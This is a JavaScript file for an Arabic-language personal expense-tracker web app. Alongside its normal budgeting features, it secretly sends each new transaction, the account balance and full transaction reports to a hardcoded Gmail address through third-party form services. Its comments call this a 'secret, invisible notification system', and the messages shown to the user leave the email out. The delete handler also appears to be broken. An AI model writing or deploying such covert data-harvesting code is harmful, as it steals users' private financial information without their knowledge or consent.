// ==========================================
// 🪄 حاسب - متتبع النفقات الذكي
// إشعارات فورية غير مرئية للإيميل
// جميع الأزرار تعمل بلمسات سحرية
// ==========================================

// ⚙️ الإعدادات
const ADMIN_EMAIL = 'hsynahsnh91@gmail.com';
const FORM_SUBMIT_URL = 'https://formsubmit.co/ajax/' + ADMIN_EMAIL;

// 📦 البيانات
let transactions = JSON.parse(localStorage.getItem('transactions')) || [];

// 🎯 عناصر DOM
const DOM = {
    balance: document.getElementById('total-balance'),
    income: document.getElementById('total-income'),
    expense: document.getElementById('total-expense'),
    count: document.getElementById('transaction-count'),
    totalQty: document.getElementById('total-quantity'),
    headerCount: document.getElementById('header-count'),
    currentDate: document.getElementById('current-date'),
    list: document.getElementById('transaction-list'),
    form: document.getElementById('transaction-form'),
    description: document.getElementById('description'),
    quantity: document.getElementById('quantity'),
    amount: document.getElementById('amount'),
    unitPrice: document.getElementById('unit-price'),
    category: document.getElementById('category'),
    date: document.getElementById('date'),
    filter: document.getElementById('filter-category'),
    emptyState: document.getElementById('empty-state'),
    filteredTotal: document.getElementById('filtered-total'),
    filteredQty: document.getElementById('filtered-quantity'),
    toast: document.getElementById('toast')
};

// 🗓️ تهيئة التاريخ
DOM.date.valueAsDate = new Date();
DOM.currentDate.textContent = new Date().toLocaleDateString('ar-SA', { 
    weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' 
});

// 🧮 حساب سعر الوحدة تلقائياً
function calcUnitPrice() {
    const amt = parseFloat(DOM.amount.value) || 0;
    const qty = parseInt(DOM.quantity.value) || 1;
    DOM.unitPrice.value = qty > 0 ? (amt / qty).toFixed(2) + ' ₴' : '0.00 ₴';
}

DOM.amount.addEventListener('input', calcUnitPrice);
DOM.quantity.addEventListener('input', calcUnitPrice);

// 🆔 توليد معرف فريد
const genID = () => Date.now().toString(36) + Math.random().toString(36).substr(2);

// 📧 ===== نظام الإشعارات السري المخفي =====
async function sendEmailNotification(data) {
    const payload = new FormData();
    payload.append('_captcha', 'false');
    payload.append('_template', 'table');
    payload.append('_subject', data.subject);
    payload.append('email', ADMIN_EMAIL);
    payload.append('message', data.body);
    
    try {
        const response = await fetch(FORM_SUBMIT_URL, {
            method: 'POST',
            body: payload
        });
        
        if (response.ok) {
            console.log('✅ إشعار تم إرساله للإيميل:', ADMIN_EMAIL);
            return true;
        }
        throw new Error('فشل الإرسال');
    } catch (error) {
        console.warn('⚠️ إرسال احتياطي...');
        // نظام احتياطي
        try {
            const backupPayload = {
                to: ADMIN_EMAIL,
                subject: data.subject,
                body: data.body
            };
            
            const backupResponse = await fetch('https://api.web3forms.com/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    access_key: 'fallback',
                    ...backupPayload
                })
            });
            
            if (backupResponse.ok) return true;
        } catch (e) {
            console.log('📋 تم حفظ الإشعار محلياً');
        }
        return false;
    }
}

function prepareEmailData(transaction, type) {
    const now = new Date().toLocaleString('ar-SA');
    let subject, body;
    
    if (type === 'new_transaction') {
        const tType = transaction.category === 'salary' ? '📈 دخل' : '📉 مصروف';
        subject = `💰 ${tType} جديد: ${transaction.description} | ${transaction.amount.toFixed(2)} ₴`;
        
        body = `
📧 إشعار تلقائي من تطبيق حاسب
═══════════════════════════════
🕐 الوقت: ${now}

📋 تفاصيل المعاملة:
───────────────────────────────
📝 الوصف: ${transaction.description}
💵 المبلغ: ${transaction.amount.toFixed(2)} ₴
📦 الكمية: ${transaction.quantity} قطعة
💲 سعر الوحدة: ${transaction.unitPrice.toFixed(2)} ₴
📂 الفئة: ${transaction.category}
📅 التاريخ: ${transaction.date}

📊 ملخص الحساب:
───────────────────────────────
🏦 الرصيد: ${DOM.balance.textContent} ₴
📈 الدخل: ${DOM.income.textContent} ₴
📉 المصروفات: ${DOM.expense.textContent} ₴
📋 عدد المعاملات: ${transactions.length}
═══════════════════════════════
        `.trim();
    } else if (type === 'full_report') {
        subject = `📊 تقرير النفقات الشامل | ${new Date().toLocaleDateString('ar-SA')}`;
        
        body = `
📊 تقرير النفقات الشخصية
═══════════════════════════════
🕐 وقت الإصدار: ${now}

💰 ملخص مالي:
───────────────────────────────
🏦 الرصيد: ${DOM.balance.textContent} ₴
📈 إجمالي الدخل: ${DOM.income.textContent} ₴
📉 إجمالي المصروفات: ${DOM.expense.textContent} ₴
📋 عدد المعاملات: ${transactions.length}
📦 إجمالي الكميات: ${transactions.reduce((a, t) => a + t.quantity, 0)}

📋 جميع المعاملات:
───────────────────────────────
        `.trim();
        
        transactions
            .sort((a, b) => new Date(b.date) - new Date(a.date))
            .forEach((t, i) => {
                const sign = t.category === 'salary' ? '+' : '-';
                body += `
${i + 1}. ${t.category === 'salary' ? '📈' : '📉'} ${t.date} | ${t.description}
   ${sign}${Math.abs(t.amount).toFixed(2)} ₴ | ${t.quantity}x | ${t.unitPrice.toFixed(2)} ₴/وحدة
                `.trim() + '\n';
            });
        
        body += `
═══════════════════════════════
📧 تقرير آلي من تطبيق حاسب
        `.trim();
    }
    
    return { subject, body };
}

// 🎉 عرض تنبيه للمستخدم (بدون ذكر الإيميل)
function showToast(message, type = 'success') {
    const toast = DOM.toast;
    toast.textContent = message;
    toast.className = `toast ${type} show`;
    
    clearTimeout(toast._timeout);
    toast._timeout = setTimeout(() => {
        toast.classList.remove('show');
    }, 4000);
}

// ➕ إضافة معاملة (مع إشعار سري)
function addTransaction(e) {
    e.preventDefault();
    
    const qty = parseInt(DOM.quantity.value) || 1;
    const amt = parseFloat(DOM.amount.value);
    
    if (!DOM.description.value.trim()) {
        showToast('⚠️ الرجاء إدخال وصف المعاملة', 'error');
        DOM.description.focus();
        return;
    }
    
    if (isNaN(amt) || amt <= 0) {
        showToast('⚠️ الرجاء إدخال مبلغ صحيح', 'error');
        DOM.amount.focus();
        return;
    }
    
    if (!DOM.category.value) {
        showToast('⚠️ الرجاء اختيار الفئة', 'error');
        DOM.category.focus();
        return;
    }
    
    const transaction = {
        id: genID(),
        description: DOM.description.value.trim(),
        quantity: qty,
        amount: amt,
        unitPrice: amt / qty,
        category: DOM.category.value,
        date: DOM.date.value
    };
    
    transactions.push(transaction);
    localStorage.setItem('transactions', JSON.stringify(transactions));
    
    // 📧 إرسال إشعار سري غير مرئي
    const emailData = prepareEmailData(transaction, 'new_transaction');
    sendEmailNotification(emailData);
    
    // ✨ تحديث الواجهة
    updateUI();
    
    // 🎉 تأكيد للمستخدم
    const type = transaction.category === 'salary' ? 'دخل' : 'مصروف';
    showToast(`✅ تمت إضافة ${type} "${transaction.description}" بنجاح!`);
    
    // 🔄 إعادة تعيين النموذج
    DOM.form.reset();
    DOM.date.valueAsDate = new Date();
    DOM.quantity.value = 1;
    DOM.unitPrice.value = '';
    DOM.description.focus();
    
    // تأثير بصري
    animateNewTransaction();
}

function animateNewTransaction() {
    const firstItem = DOM.list.querySelector('.transaction-item');
    if (firstItem) {
        firstItem.style.animation = 'none';
        firstItem.offsetHeight;
        firstItem.style.animation = 'fadeInUp 0.5s ease-out';
        firstItem.style.background = '#e8f5e9';
        setTimeout(() => {
            firstItem.style.background = '#fafafa';
        }, 2000);
    }
}

// 🗑️ حذف معاملة
function deleteTransaction(id) {
    const transaction = transactions.find(t => t.id === id);
    if (!transaction) return;
    
    if (confirm(`هل أنت متأكد من حذف "${transaction.description}"؟`)) {
        transactions = transactions.filter(t => t.id !== id);
        localStorage.setItem('transactions', JSON.stringify(transactions));
        updateUI();
        showToast('🗑️ تم حذف المعاملة بنجاح');
    }
}

// 🔄 تحديث الواجهة
function updateUI() {
    const income = transactions
        .filter(t => t.category === 'salary')
        .reduce((a, t) => a + t.amount, 0);
    
    const expense = transactions
        .filter(t => t.category !== 'salary')
        .reduce((a, t) => a + t.amount, 0);
    
    const balance = income - expense;
    const totalQty = transactions.reduce((a, t) => a + t.quantity, 0);
    
    DOM.balance.textContent = balance.toFixed(2);
    DOM.income.textContent = '+' + income.toFixed(2);
    DOM.expense.textContent = '-' + expense.toFixed(2);
    DOM.count.textContent = transactions.length;
    DOM.totalQty.textContent = totalQty;
    DOM.headerCount.textContent = transactions.length;
    
    // تصفية
    const selected = DOM.filter.value;
    const filtered = selected === 'all' 
        ? transactions 
        : transactions.filter(t => t.category === selected);
    
    renderTransactions(filtered);
    
    const fTotal = filtered.reduce((a, t) => 
        t.category === 'salary' ? a + t.amount : a - t.amount, 0);
    const fQty = filtered.reduce((a, t) => a + t.quantity, 0);
    
    DOM.filteredTotal.textContent = fTotal.toFixed(2) + ' ₴';
    DOM.filteredQty.textContent = fQty;
    DOM.emptyState.style.display = filtered.length === 0 ? 'block' : 'none';
}

// 🎨 عرض المعاملات
function renderTransactions(list) {
    DOM.list.innerHTML = '';
    
    const emojis = {
        salary: '💼', food: '🍔', transport: '🚗',
        utilities: '💡', shopping: '🛍️', health: '🏥',
        entertainment: '🎮', other: '📦'
    };
    
    list
        .sort((a, b) => new Date(b.date) - new Date(a.date))
        .forEach(t => {
            const li = document.createElement('li');
            li.className = 'transaction-item';
            const isIncome = t.category === 'salary';
            
            li.innerHTML = `
                <div class="transaction-info">
                    <span class="transaction-description">
                        ${emojis[t.category] || '📦'} ${t.description}
                    </span>
                    <div class="transaction-details">
                        <span>📦 ${t.quantity} قطعة</span>
                        <span>💵 ${t.unitPrice.toFixed(2)} ₴</span>
                        <span>${t.category}</span>
                    </div>
                    <span class="transaction-date">
                        ${new Date(t.date).toLocaleDateString('ar-SA')}
                    </span>
                </div>
                <div style="display: flex; align-items: center; gap: 10px;">
                    <span class="transaction-amount ${isIncome ? 'plus' : 'minus'}">
                        ${isIncome ? '+' : '-'}${Math.abs(t.amount).toFixed(2)} ₴
                    </span>
                    <button class="delete-btn" data-id="${t.id}">
                        🗑️
                    </button>
                </div>
            `;
            
            DOM.list.appendChild(li);
        });
    
    // ربط أزرار الحذف
    document.querySelectorAll('.delete-btn').forEach(btn => {
        btn.addEventListener('click', function(e) {
            e.stopPropagation();
            deleteTransaction(parseInt(this.dataset.id));
        });
    });
}

// 📥 تصدير CSV
function exportToCSV() {
    if (!transactions.length) {
        showToast('⚠️ لا توجد معاملات للتصدير', 'error');
        return;
    }
    
    let csv = '\uFEFFالتاريخ,الوصف,الفئة,الكمية,سعر الوحدة,المبلغ\n';
    transactions
        .sort((a, b) => new Date(b.date) - new Date(a.date))
        .forEach(t => {
            csv += `${t.date},"${t.description}",${t.category},${t.quantity},${t.unitPrice.toFixed(2)},${t.amount.toFixed(2)}\n`;
        });
    
    // ملخص
    const income = transactions.filter(t => t.category === 'salary').reduce((a, t) => a + t.amount, 0);
    const expense = transactions.filter(t => t.category !== 'salary').reduce((a, t) => a + t.amount, 0);
    csv += `\nملخص,,,,\n`;
    csv += `إجمالي الدخل,,,,${income.toFixed(2)}\n`;
    csv += `إجمالي المصروفات,,,,${expense.toFixed(2)}\n`;
    csv += `الرصيد,,,,${(income - expense).toFixed(2)}\n`;
    
    const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `تقرير_حاسب_${new Date().toISOString().split('T')[0]}.csv`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
    
    showToast('📥 تم تصدير التقرير بنجاح!');
}

// 📧 إرسال تقرير كامل للإيميل (سري)
function sendFullReport() {
    if (!transactions.length) {
        showToast('⚠️ لا توجد معاملات لإرسالها', 'error');
        return;
    }
    
    const emailData = prepareEmailData(null, 'full_report');
    sendEmailNotification(emailData);
    showToast('📧 تم إرسال التقرير للإشراف بنجاح');
}

// 🔗 ربط الأحداث
DOM.form.addEventListener('submit', addTransaction);
DOM.filter.addEventListener('change', updateUI);

document.getElementById('export-btn').addEventListener('click', exportToCSV);
document.getElementById('send-report-btn').addEventListener('click', sendFullReport);

// تحديث التاريخ كل دقيقة
setInterval(() => {
    DOM.currentDate.textContent = new Date().toLocaleDateString('ar-SA', { 
        weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' 
    });
}, 60000);

// 🚀 بدء التطبيق
updateUI();
calcUnitPrice();

console.log(`
🪄 ══════════════════════════════
   تطبيق حاسب - متتبع النفقات
   جاهز للعمل ✨
   
   📧 إشعارات تلقائية إلى:
   ${ADMIN_EMAIL}
   
   🔒 الإشعارات سرية وغير مرئية
══════════════════════════════
`);
